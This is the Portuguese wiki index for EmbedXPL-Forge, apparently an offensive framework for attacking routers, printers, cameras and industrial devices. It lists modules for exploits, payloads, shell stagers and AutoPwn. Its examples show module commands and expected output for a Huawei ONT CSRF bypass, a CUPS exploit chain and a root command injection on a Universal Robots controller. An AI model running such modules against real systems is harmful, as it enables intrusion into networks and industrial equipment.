<p align="center">
  <img src="../../img/embedxpl-forge-banner_16x9.png" alt="EmbedXPL-Forge" width="100%">
</p>

# EmbedXPL-Forge Wiki (pt-BR)

**Idioma:** Português (pt-BR). **English:** [../en-US/README.md](../en-US/README.md)

Documentação oficial de uso do framework. Leia no GitHub ou copie para a **GitHub Wiki** (repositório Git separado).

---

## Diagramas de Arquitetura (classes de dispositivos)

Galeria PNG. Fontes Mermaid: [../../diagrams/architecture/README.md](../../diagrams/architecture/README.md).

| Roteador SOHO | Switch Gerenciado |
|:-------------:|:-----------------:|
| ![SOHO](../../img/architecture/exf_arch_router_soho.png) | ![Switch](../../img/architecture/exf_arch_switch_l2l3.png) |

| ISP CPE / GPON ONT | Edge Misto |
|:------------------:|:----------:|
| ![ISP CPE](../../img/architecture/exf_arch_isp_cpe.png) | ![Mixed edge](../../img/architecture/exf_arch_edge_mixed.png) |

| Mapa de Ataque Completo GPON ONT |
|:--------------------------------:|
| ![GPON ONT attack map](../../img/architecture/exf_arch_gpon_ont_attack.png) |

---

## Índice de Documentos

| Documento | Tópicos |
|-----------|---------|
| [01-introducao-e-instalacao.md](01-introducao-e-instalacao.md) | Introdução, escopo, Python, instalação, diagnósticos, logs, arquitetura |
| [02-shell-interativo-comandos.md](02-shell-interativo-comandos.md) | Comandos interativos, todas as opções, shell stager, discover, sessions |
| [03-busca-e-listagem.md](03-busca-e-listagem.md) | `search`, `show`, listagem de módulos, dispositivos, lookup de CVE |
| [04-modo-nao-interativo.md](04-modo-nao-interativo.md) | `embedxpl -m / -s`, todas as flags, automação, multi-alvo |
| [05-modulos-creds.md](05-modulos-creds.md) | Módulos de credenciais, todas as opções, wordlists, exemplos |
| [06-modulos-exploits.md](06-modulos-exploits.md) | Módulos de exploit, lista de CVE, fluxo check/run, shell stager |
| [07-scanners-e-autopwn.md](07-scanners-e-autopwn.md) | Scanners, AutoPwn, lookup OUI, phase gate |
| [08-modulos-generic.md](08-modulos-generic.md) | Módulos genéricos multi-vendor (UPnP IGD, SSDP, SNMP, etc.) |
| [09-payloads-e-encoders.md](09-payloads-e-encoders.md) | Payloads (32), encoders (13), lista de arquiteturas |
| [10-catalogos-e-ferramentas.md](10-catalogos-e-ferramentas.md) | Catálogos JSON, scripts tools/, quality gates |
| [11-troubleshooting.md](11-troubleshooting.md) | Falhas comuns e correções |
| [12-nse-script-manager.md](12-nse-script-manager.md) | Gerenciador NSE: install, list, run, check, info (11 scripts) |
| [13-shell-stager.md](13-shell-stager.md) | Shell stager: 27 tipos, listener PTY, Meterpreter, GTFOBins |
| [14-sysinfo-e-compute.md](14-sysinfo-e-compute.md) | Comandos `sysinfo` e `compute`, detecção de GPU, modos de computação |
| [15-comando-discover.md](15-comando-discover.md) | Comando `discover`: CIDR, host único, arquivo de alvos, sessões |
| [16-comando-sessions.md](16-comando-sessions.md) | Comando `sessions`: list, show, delete, export, purge |
| [17-catalogo-apt.md](17-catalogo-apt.md) | Catálogo APT: grupos, cadeias de ataque, apt run/show/search |
| [18-ferramentas-firmware.md](18-ferramentas-firmware.md) | `firmware-dl` e `firmware-analyze`: download, binwalk, unblob, EMBA |
| [19-modo-infra-wizard.md](19-modo-infra-wizard.md) | Modo `--infra wizard` e `--infra <tipo> --context <ctx>` |
| [20-modulos-ics-ot.md](20-modulos-ics-ot.md) | Módulos ICS/OT: Modbus, S7comm, BACnet, EtherNet/IP, DNP3, UR |
| [21-engine-rtsp-camera.md](21-engine-rtsp-camera.md) | Engine RTSP, scanners de câmera, Cameradar, ONVIF |
| [22-referencia-modulos-cve.md](22-referencia-modulos-cve.md) | Referência cruzada CVE por ano e módulo EmbedXPL |
| [23-referencia-vendors-firewalls.md](23-referencia-vendors-firewalls.md) | Catálogo completo de vendors: firewalls, câmeras, roteadores, BMC, ICS |

---

## Exemplos End-to-End (entrada e saída esperada)

### Exploit de roteador (Huawei GPON ONT)

```text
exf > use exploits/routers/huawei/eg8145x6_info_disclosure
exf (EG8145X6 Info Disclosure) > set target 192.168.18.1
exf (EG8145X6 Info Disclosure) > check
exf (EG8145X6 Info Disclosure) > run
```

Saída esperada:

```text
[+] Target is a Huawei GPON ONT - extracting metadata
[+] ProductName: EG8145X6-10
[+] APPVersion: 1.1.1.1
[+] BuildTimestamp: 202410241935450553184798
[*] CSRF token (static): 9b41cc4ca5587e32228a6a593a18806d...
[+] getRandString STATIC? YES - CSRF BYPASS POSSIBLE
```

### Exploit de impressora (CUPS Pwn2Own 2026)

```text
exf > use exploits/printers/linux/cups_pwn2own_chain_cve_2026_34480
exf (CUPS Pwn2Own Chain) > set target 192.168.1.10
exf (CUPS Pwn2Own Chain) > set delay 2
exf (CUPS Pwn2Own Chain) > run
```

Saída esperada:

```text
[*] ============================================================
[*] CUPS Pwn2Own 2026 - Full Chain (CVE-2026-34480)
[*] ============================================================
[+] CUPS IPP is reachable on 192.168.1.10:631
[*] [Stage 1/4] Loading CVE-2026-34477 (cups-browsed UAF)
[+] Stage 1 complete: cups-browsed crash/UAF detected
[*] [Stage 2/4] Loading CVE-2026-34478 (heap spray)
[+] Stage 2 complete: 32/32 spray requests accepted
[*] [Stage 3/4] Loading CVE-2026-34479 (ROP chain LPE)
[+] Stage 3 complete: ROP chain delivered
[*] [Stage 4/4] Chain execution complete
[+] CUPS process no longer responding - chain likely executed
```

### Exploit ICS (Universal Robots)

```text
exf > use exploits/ics/ur_polyscope5_dashboard_cmd_injection_cve_2026_8153
exf (UR PolyScope5) > set target 10.0.1.5
exf (UR PolyScope5) > set cmd "id"
exf (UR PolyScope5) > run
```

Saída esperada:

```text
[*] Connecting to PolyScope Dashboard on 10.0.1.5:29999
[+] PolyScope Dashboard Server detected
[*] Attempting OS command injection (CVE-2026-8153)
[+] Command injection confirmed!
[+] Output: uid=0(root) gid=0(root) groups=0(root)
```

### Modo automação

```bash
python -m embedxpl -m exploits/routers/huawei/eg8145x6_info_disclosure -s "target 192.168.18.1" -s "port 80"
```

Saída esperada:

```text
[*] Running module: exploits/routers/huawei/eg8145x6_info_disclosure
[+] ProductName: EG8145X6-10
[+] APPVersion: 1.1.1.1
```

---

## Veja também

- [README.md](../../../README.md)
- [CONTRIBUTING.md](../../../CONTRIBUTING.md)
- [docs/COVERAGE_MATRIX.md](../../COVERAGE_MATRIX.md)
